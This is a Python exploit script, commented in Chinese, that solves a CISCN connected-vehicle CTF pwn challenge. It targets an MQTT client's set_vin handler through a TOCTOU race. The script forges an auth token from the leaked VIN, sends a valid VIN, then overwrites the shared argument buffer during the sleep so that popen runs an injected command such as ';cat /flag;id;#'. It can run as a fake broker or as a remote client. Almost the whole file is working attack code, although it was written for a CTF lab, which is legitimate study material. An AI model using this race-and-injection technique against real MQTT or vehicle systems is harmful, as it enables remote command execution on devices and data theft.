#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CISCN 第十八届 决赛 车联网安全 - mqtt  (Pwn) exploit

目标程序: ~/pwn-lab/platform/mqtt/pwn
  一个 MQTT 客户端(clientId=vehicle_diag)，连 tcp://localhost:9999，订阅 "diag"，
  把收到消息当 JSON 解析出 auth / cmd / arg 三个字段，再丢给一个新线程处理。

漏洞: set_vin 的 TOCTOU 命令注入
  * 命令模板: "echo -n %s>/mnt/VIN;cat /mnt/VIN"  -> popen() 直接执行, %s 是 arg
  * 但 set_vin 在用 arg 之前先做校验(必须纯字母数字, 长度 10..63) -> 挡住了 ;
  * 校验之后有一个 sleep(2), 而 arg/cmd/auth 都放在 .bss 全局缓冲区
  * 每个 MQTT 消息都新起一个线程处理(实习生所谓的"性能优化"), 于是:
      线程A: 校验通过 -> sleep(2) -> 用 arg 全局 拼命令 popen
      在 A 的 sleep 期间再发一条消息, 其回调会把 arg 全局改成恶意字符串
      -> A 醒来后拿着未校验的恶意 arg 执行 popen, 命令注入成功
  * 鉴权: auth 必须等于 "%08x" % hash(VIN全局) , hash 算法 h = h*31 + (signed char)c
    而 VIN 由程序每 10s 主动 publish {"vin":"...","status":"..."} 到 "diag/resp"
    -> 作为 broker/订阅者直接读出来 → 算出 token，无需知道 /mnt/VIN

用法:
  python3 solve_mqtt.py                      # 默认 127.0.0.1 9999 (本地 broker 模式)
  python3 solve_mqtt.py 127.0.0.1 9999       # 同上
  python3 solve_mqtt.py HOST PORT            # 远程: 以 MQTT 客户端连靶机暴露的 broker
  python3 solve_mqtt.py --mode server 0.0.0.0 9999   # 强制本地 broker 模式
  python3 solve_mqtt.py --mode client HOST PORT      # 强制客户端模式
  python3 solve_mqtt.py -p ';id;cat /etc/hostname;#'  # 自定义注入命令

本地(默认)演示:
  1) bash ~/pwn-lab/platform/setup_env.sh
  2) bash ~/pwn-lab/platform/run_victim.sh          # 另开终端/后台
  3) python3 ~/pwn-lab/platform/solve_mqtt.py

远程说明:
  受害程序把 broker 地址硬编码成 tcp://localhost:9999，连的是"它自己"的 9999。
  所以 server 模式只有在你能在受害主机/容器内 bind 9999 时才有意义（一般是本地或
  你能落地到靶机内部时）；对外的常见打法是 client 模式：靶机若把 MQTT broker 端口
  暴露出来，直接 `solve_mqtt.py HOST PORT` 以客户端身份订阅 diag/diag/resp 拿到 VIN、
  再往 diag 投毒即可。鉴权 token 由泄漏的 VIN 现算，所以不需要知道靶机 /mnt/VIN 内容。
"""
import argparse
import json
import re
import socket
import struct
import sys
import threading
import time

# ------------------------- 漏洞常量 -------------------------
VALID_ARG      = "1234567890"        # 能通过 set_vin 校验的合法 VIN(纯字母数字, 10..63)
DEFAULT_PAYLOAD = ";cat /flag;id;#"  # 注入载荷(不需要通过校验)
TOPIC_REQ      = "diag"              # 目标订阅的 topic(我们往这里投毒)
TOPIC_RESP     = "diag/resp"         # 目标回显 topic

FLAG_RE = re.compile(rb"[Ff][Ll][Aa][Gg]\{[^}]*\}")
VIN_RE  = re.compile(rb'"vin"\s*:\s*"((?:\\.|[^"\\])*)"', re.S)


def log(msg):
    sys.stdout.write("%s\n" % msg)
    sys.stdout.flush()


def hash_token(vin):
    """复刻 0x1509:  h = h*31 + (signed char)c  , 输出 "%08x" """
    if isinstance(vin, str):
        vin = vin.encode("latin-1")
    h = 0
    for c in vin:
        if c >= 0x80:
            c -= 0x100
        h = (h * 31 + c) & 0xFFFFFFFF
    return "%08x" % h


# ------------------------- MQTT 3.1.1 手写编解码 -------------------------
def enc_len(n):
    out = bytearray()
    while True:
        b = n % 128
        n //= 128
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def enc_str(s):
    b = s.encode("latin-1") if isinstance(s, str) else s
    return struct.pack(">H", len(b)) + b


def parse_publish(flags, body):
    tlen = struct.unpack(">H", body[0:2])[0]
    topic = body[2:2 + tlen].decode("latin-1")
    off = 2 + tlen
    qos = (flags >> 1) & 3
    pid = 0
    if qos > 0:
        pid = struct.unpack(">H", body[off:off + 2])[0]
        off += 2
    return topic, body[off:], pid


class MQTT(object):
    def __init__(self, sock):
        self.s = sock
        self.wlock = threading.Lock()

    def send(self, data):
        with self.wlock:
            self.s.sendall(data)

    def recv_exact(self, n, timeout=1.0):
        self.s.settimeout(timeout)
        buf = b""
        while len(buf) < n:
            try:
                chunk = self.s.recv(n - len(buf))
            except socket.timeout:
                return None
            except OSError:
                return None
            if not chunk:
                return None
            buf += chunk
        return buf

    def read_packet(self, timeout=1.0):
        """返回 (type, flags, body) 或 None(超时/断开)"""
        h = self.recv_exact(1, timeout)
        if not h:
            return None
        ptype = h[0] >> 4
        flags = h[0] & 0x0F
        mult = 1
        rem = 0
        for _ in range(4):
            b = self.recv_exact(1, timeout)
            if not b:
                return None
            rem += (b[0] & 0x7F) * mult
            if not (b[0] & 0x80):
                break
            mult *= 128
        body = b""
        if rem:
            body = self.recv_exact(rem, timeout)
            if body is None:
                return None
        return ptype, flags, body

    # --- 构造/应答 ---
    def send_publish(self, topic, payload, qos=0, pid=1):
        if isinstance(payload, str):
            payload = payload.encode("utf-8")
        var = enc_str(topic)
        if qos > 0:
            var += struct.pack(">H", pid)
        var += payload
        hdr = 0x30 | (qos << 1)
        self.send(bytes([hdr]) + enc_len(len(var)) + var)

    def send_puback(self, pid):
        self.send(b"\x40\x02" + struct.pack(">H", pid))

    def send_connect(self, client_id="solver", keepalive=60):
        var = enc_str("MQTT") + bytes([4, 0x02]) + struct.pack(">H", keepalive)
        var += enc_str(client_id)
        self.send(b"\x10" + enc_len(len(var)) + var)

    def send_subscribe(self, topics, pid=1, qos=1):
        var = struct.pack(">H", pid)
        for t in topics:
            var += enc_str(t) + bytes([qos])
        self.send(b"\x82" + enc_len(len(var)) + var)


# ------------------------- exploit 核心 -------------------------
class Exploit(object):
    def __init__(self, mq, payload):
        self.mq = mq
        self.payload = payload
        self.token = None
        self.busy = False
        self.done = False
        self.outputs = []
        self.hits = []

    def note_vin(self, vin_bytes):
        tok = hash_token(vin_bytes)
        if tok != self.token:
            self.token = tok
            log("[+] 泄漏 VIN   = %r" % vin_bytes)
            log("[+] 推导 token = %s  (hash: h=h*31+(signed char)c)" % tok)

    def report(self, topic, payload):
        self.outputs.append((topic, payload))
        log("[<] %s : %r" % (topic, payload))
        for m in FLAG_RE.findall(payload):
            self.hits.append(m)
            log("[!] 命中 flag: %s" % m.decode("latin-1"))
            self.done = True

    def attempt(self):
        """一发 exploit: A 合法 set_vin(进入 sleep 2), 期间 B 覆写 arg 全局"""
        tok = self.token
        ma = json.dumps({"auth": tok, "cmd": "set_vin", "arg": VALID_ARG})
        mb = json.dumps({"auth": tok, "cmd": "unknown_command", "arg": self.payload})
        log("[>] 步骤1 (合法 set_vin, 通过校验后 sleep 2s): %s" % ma)
        self.mq.send_publish(TOPIC_REQ, ma)
        for _ in range(5):
            time.sleep(0.45)
            if self.done:
                return
            log("[>] 步骤2 (竞争覆写 arg 全局): %s" % mb)
            self.mq.send_publish(TOPIC_REQ, mb)
        log("[*] 等待 popen 回显 ... (线程A 约 2s 后执行注入命令)")
        t0 = time.time()
        while time.time() - t0 < 4 and not self.done:
            time.sleep(0.2)

    def trigger(self):
        if self.busy or self.done:
            return
        self.busy = True
        threading.Thread(target=self._run, daemon=True).start()

    def _run(self):
        try:
            self.attempt()
        finally:
            self.busy = False


# ------------------------- 主循环（共用） -------------------------
def handle_common(ex, ptype, flags, body, is_broker):
    """处理一条来自对端的报文, 返回 False 表示结束"""
    if ptype == 1:            # CONNECT
        log("[+] 收到 CONNECT")
        if is_broker:
            ex.mq.send(b"\x20\x02\x00\x00")   # CONNACK ok
            log("[+] 已回 CONNACK")
    elif ptype == 8:          # SUBSCRIBE
        pid = struct.unpack(">H", body[0:2])[0]
        log("[+] 收到 SUBSCRIBE pid=%d body=%r" % (pid, body))
        if is_broker:
            ex.mq.send(b"\x90\x03" + struct.pack(">H", pid) + b"\x01")  # SUBACK qos1
            log("[+] 已回 SUBACK")
    elif ptype == 9:          # SUBACK
        pid = struct.unpack(">H", body[0:2])[0]
        log("[+] 收到 SUBACK pid=%d rc=0x%02x" % (pid, body[2] if len(body) > 2 else -1))
    elif ptype == 12:         # PINGREQ
        if is_broker:
            ex.mq.send(b"\xd0\x00")
    elif ptype == 13:         # PINGRESP
        pass
    elif ptype == 14:         # DISCONNECT
        log("[-] 对端 DISCONNECT")
        return False
    elif ptype == 3:          # PUBLISH
        topic, payload, pid = parse_publish(flags, body)
        qos = (flags >> 1) & 3
        if qos > 0 and pid:
            ex.mq.send_puback(pid)
        m = VIN_RE.search(payload)
        if m and not ex.done:
            ex.note_vin(m.group(1))
            ex.trigger()
            ex.outputs.append((topic, payload))
        else:
            ex.report(topic, payload)
    return True


def run_broker(bind_host, port, payload, timeout):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((bind_host, port))
    srv.listen(5)
    log("[*] 假 broker 监听 %s:%d , 等待目标客户端连入 ..." % (bind_host, port))
    srv.settimeout(timeout)
    try:
        conn, addr = srv.accept()
    except socket.timeout:
        log("[-] 等待目标连接超时")
        return 1
    log("[+] 目标已连入: %s:%d" % addr)
    mq = MQTT(conn)
    ex = Exploit(mq, payload)
    deadline = time.time() + timeout
    while time.time() < deadline and not ex.done:
        pkt = mq.read_packet(timeout=1.0)
        if pkt is None:
            continue
        if not handle_common(ex, pkt[0], pkt[1], pkt[2], True):
            break
    return 0 if ex.hits else 1


def run_client(host, port, payload, timeout):
    log("[*] 以 MQTT 客户端连接 %s:%d ..." % (host, port))
    try:
        s = socket.create_connection((host, port), timeout=10)
    except OSError as e:
        log("[-] 连接失败: %s" % e)
        return 1
    mq = MQTT(s)
    ex = Exploit(mq, payload)
    mq.send_connect(client_id="solver")
    log("[+] 已发 CONNECT")
    time.sleep(0.3)
    mq.send_subscribe([TOPIC_REQ, TOPIC_RESP], pid=1)
    log("[+] 已订阅 %s / %s" % (TOPIC_REQ, TOPIC_RESP))
    deadline = time.time() + timeout
    while time.time() < deadline and not ex.done:
        pkt = mq.read_packet(timeout=1.0)
        if pkt is None:
            continue
        if not handle_common(ex, pkt[0], pkt[1], pkt[2], False):
            break
    return 0 if ex.hits else 1


def main():
    ap = argparse.ArgumentParser(description="CISCN 车联网 mqtt Pwn exploit")
    ap.add_argument("host", nargs="?", default="127.0.0.1")
    ap.add_argument("port", nargs="?", type=int, default=9999)
    ap.add_argument("--mode", choices=["auto", "server", "client"], default="auto",
                    help="auto: 本机地址走 server(假 broker), 远程地址走 client")
    ap.add_argument("-p", "--payload", default=DEFAULT_PAYLOAD,
                    help="注入到 set_vin 命令模板里的命令, 默认 ';cat /flag;id;#'")
    ap.add_argument("-t", "--timeout", type=int, default=90)
    args = ap.parse_args()

    mode = args.mode
    if mode == "auto":
        mode = "server" if args.host in ("127.0.0.1", "localhost", "::1", "0.0.0.0", "") else "client"

    log("=" * 68)
    log(" 注入载荷 payload = %r" % args.payload)
    log(" 模式 mode = %s   (server=本地假 broker, client=连远程 broker)" % mode)
    log("=" * 68)

    if mode == "server":
        rc = run_broker(args.host, args.port, args.payload, args.timeout)
    else:
        rc = run_client(args.host, args.port, args.payload, args.timeout)
    log("=" * 68)
    if rc == 0:
        log("[+] EXPLOIT SUCCESS")
    else:
        log("[-] 未拿到 flag (可调大 -t 超时 / 重跑)")
    return rc


if __name__ == "__main__":
    sys.exit(main())